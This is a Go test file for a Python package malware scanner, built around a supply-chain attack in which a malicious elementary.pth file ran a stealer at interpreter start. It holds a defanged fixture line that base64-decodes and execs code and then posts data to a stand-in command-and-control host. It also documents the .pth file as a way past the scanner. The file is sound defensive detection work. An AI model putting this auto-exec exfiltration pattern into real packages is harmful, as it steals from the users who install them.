package pysource

// Attack 2026-26 (package half): elementary-data 0.23.3 shipped its stealer
// as a top-level elementary.pth — one ~245 KB line of base64 (two XOR
// layers inside). site.py executes any .pth line that starts with `import`
// at every interpreter start, so the payload ran without `import elementary`.
//
// GAP, asserted as current behaviour: Scan only reads *.py files (scan.go,
// the HasSuffix(".py") filter), so the same decode-and-exec line that is
// detected in a module is not seen in a .pth. The control below proves the
// bytes themselves are detectable: the identical line under a .py name
// fires obfuscated_exec.

import "testing"

// atk26Pth is a defanged elementary.pth line: decode a blob, exec it, and
// post the result (the curl --data-binary exfil, here urllib to an invalid
// host so the dropper co-marker is present).
const atk26Pth = `import base64,urllib.request;exec(base64.b64decode("cHJpbnQoMSk="));urllib.request.urlopen("https://c2.example.invalid/u",data=b"x")` + "\n"

func TestAttack2026_26_ElementaryPthNotScanned(t *testing.T) {
	if r := Scan(map[string][]byte{"elementary.pth": []byte(atk26Pth)}); r.Detected {
		t.Fatalf(".pth files are now scanned (%+v): update the attack-26 timing to feed_blind", r)
	}
	r := Scan(map[string][]byte{"elementary/__init__.py": []byte(atk26Pth)})
	if !r.Detected || r.Kind != "obfuscated_exec" {
		t.Fatalf("control: the same line in a module must fire obfuscated_exec, got %+v", r)
	}
	// Negative control: a benign path-configuration .pth (what setuptools
	// and editable installs write) is not a finding either way.
	if r := Scan(map[string][]byte{"distutils-precedence.pth": []byte("import os; var = 'SETUPTOOLS_USE_DISTUTILS'\n")}); r.Detected {
		t.Fatalf("benign .pth flagged: %+v", r)
	}
}
